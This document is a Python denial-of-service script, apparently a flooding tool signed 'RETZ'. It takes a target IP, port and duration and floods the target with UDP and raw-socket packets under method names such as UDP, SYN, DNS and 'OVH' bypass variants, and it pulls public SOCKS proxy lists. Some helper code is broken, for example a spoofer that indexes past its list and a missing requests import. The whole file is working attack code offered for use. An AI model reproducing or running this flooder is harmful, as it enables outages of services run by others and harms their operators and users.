import sys, os, socket, time, threading, random

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all")
        urlproxy = ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5")
        getproxy()
        askthreads()
    else:
        proxyask()  

def randsender(ip, times, port, dmg):

  timeout = time.time() + float(times)
  sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  while time.time() < timeout:
    sock.sendto(dmg, (ip, int(port)))
    s.sendto(dmg, (ip, int(port)))

def stdsender(ip, times, port, payload):

  timeout = time.time() + float(times)
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  while time.time() < timeout:
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))

os.system("clear")
def main():
  try:
    method = str(sys.argv[1])
    ip = str(sys.argv[2])
    port = int(sys.argv[3])
    times = int(sys.argv[4])

    banner = (f"""
\033[91m           

╔══════════════════════════╦═══════════════════════╗

                                             
          ##         ##         ##           
  #####   ##                    ##    #####  
 ##       ## ##     ###      #####   ##      
  ####    ####       ##     ##  ##    ####   
     ##   ## ##      ##     ##  ##       ##  
 #####    ##  ##    ####     #####   #####   
                                             

    
               [!]ATTACK SEND[×]
                            
\033[91m               [×] IP : [\033[91m{ip}\033[91m]
\033[91m               [×] PORT : [\033[91m{port}\033[91m]
\033[91m               [×] TIMES : [\033[91m{times}\033[91m]
\033[91m          [×] METHODS : [\033[91m{method}\033[91m]
\033[91 ╚═╦═══════════════════════╦╩╦════════════════════╦═╝
""")

    if method == "UDP":
      try:
        socket.gethostbyname(ip)
        pack = 600
        dmg = random._urandom(int(pack))
        threading.Thread(target=randsender, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "UDPV2":
      try:
        socket.gethostbyname(ip)
        pack = 65500
        dmg = random._urandom(int(pack))
        threading.Thread(target=randsender, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "UDPV3":
      try:
        socket.gethostbyname(ip)
        payload = b'5544502041545441434b204259205245545a203e3e20c397c39720494e4a454354494f4e2055445020c397c397203c3c204259504153532055445020464c4f4f44205252455820434f4d4d554e495459'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCP":
      try:
        socket.gethostbyname(ip)
        pack = 1460
        dmg = random._urandom(int(pack))
        threading.Thread(target=randsender, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCPV2":
      try:
        socket.gethostbyname(ip)
        payload = b'54435020425950415353204d4554484f44204259205245545a203e3e20c397444f574e20444f574ec3973e3e2052455820434f4d4d554e495459'
        threading.Thread(target=stdsender, args=(ip, port, times, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCPV3":
      try:
        socket.gethostbyname(ip)
        payload = b'42595041535320544350204d4554484f4453203d3d3e205245545a203c3d3d2041545441434b494e4720494e4a454354494f4e204252555445464f524345'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVH":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b204f564820534153203e3e2044454c4159203e3e20464c4f4f44204259205245545a203c3c20494e4a454354494f4e204f56482053415320c397c397c39720444f574e'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV2":
      try:
        socket.gethostbyname(ip)
        payload = b'4f5648204e41542041545441434b2046524f4d205245545a203e205245582052494f5420434f4d4d554e495459'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV3":
      try:
        socket.gethostbyname(ip)
        payload = b'5245545a2041545441434b204f564820534153203e205245582052494f5420434f4d4d554e49545920494e4a454354'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV4":
      try:
        socket.gethostbyname(ip)
        payload = b'5245545a2041545441434b204f56482053415320494e4a4543542057495448205245582052494f5420434f4d4d554e495459'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYN":
      try:
        socket.gethostbyname(ip)
        payload = b'5245545a204c555454205441414e4f532041545441434b2053594e204d4554484f44203e3e3e205245582052494f5420434f4d4d554e495459203e3e3e2036313520383131203635353030'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV2":
      try:
        socket.gethostbyname(ip)
        payload = b'494e4a454354494f4e2053594e204259205245545a203e3e205245582052494f5420434f4d4d554e495459203c3c20494e4a454354494f4e2053594e204259205245545a'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNS":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b494e4720444e53204259205245545a20c3973d20464c4f4f44494e47203dc39720494e4a45435420c3973d2044454c4159203dc39720444f574e20c3973d2052455820434f4d4d554e495459'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOOD":
      try:
        socket.gethostbyname(ip)
        payload = b'464c4f4f442041545441434b20c3973d20464c4f4f44494e4720c3973d20494e4a45435420c3973d20464c4f4f44204259205245545a2052455820434f4d4d554e49545920464c4f4f44'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOODV2":
      try:
        socket.gethostbyname(ip)
        payload = b'464c4f4f44494e4720563220494e4a454354204259205245545a2e'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOODV3":
      try:
        socket.gethostbyname(ip)
        payload = b'464c4f4f44494e4720563220494e4a454354204259205245545a2e'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV3":
      try:
        socket.gethostbyname(ip)
        payload = b'53594e20464c4f4f442041545441434b204259205245545a204142434844495349454a46'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV4":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b2053594e2056203420464c4f4f44494e47204259205245545a20464f534f574b524a43'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNSV2":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b494e4720444e53205632204259205245545a20464c4f4f44494e4720494e4a454354494f4e205245582052494f54'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNSV3":
      try:
        socket.gethostbyname(ip)
        payload = b'494e4a454354494f4e2041545441434b20444e53205633204259205245545a20464c4f4f44494e4720414a53495849444a444b53'
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass

  except:
    print("""
\033[91m

 
                                             
          ##         ##         ##           
  #####   ##                    ##    #####  
 ##       ## ##     ###      #####   ##      
  ####    ####       ##     ##  ##    ####   
     ##   ## ##      ##     ##  ##       ##  
 #####    ##  ##    ####     #####   #####   
                                             

     ╔═════════════════════════════════════════════════════╗
   ║          UDP           ║ ║           OVH            ║
   ║         UDPV2          ║ ║          OVHV2           ║
   ║         UDPV3          ║ ║          OVHV3           ║
   ║          TCP           ║ ║          OVHV4           ║
   ║         TCPV2          ║ ║           DNS            ║
   ║         TCPV3          ║ ║          DNSV2           ║
   ║         FLOOD          ║ ║          DNSV3           ║
   ║        FLOODV2         ║ ║           SYN            ║
   ║        FLOODV3         ║ ║          SYNV2           ║
   ║        [COMING         ║ ║          SYNV3           ║
   ║          SOON]         ║ ║          SYNV4           ║
  ╔╩════════════════════════╝ ╚══════════════════════════╩╗
  ║         USAGE : [METHOD] [IP] [PORT] [TIME]           ║
  ╚═══════════════════════════════════════════════════════╝
""")

global times

if __name__ == '__main__':
  main()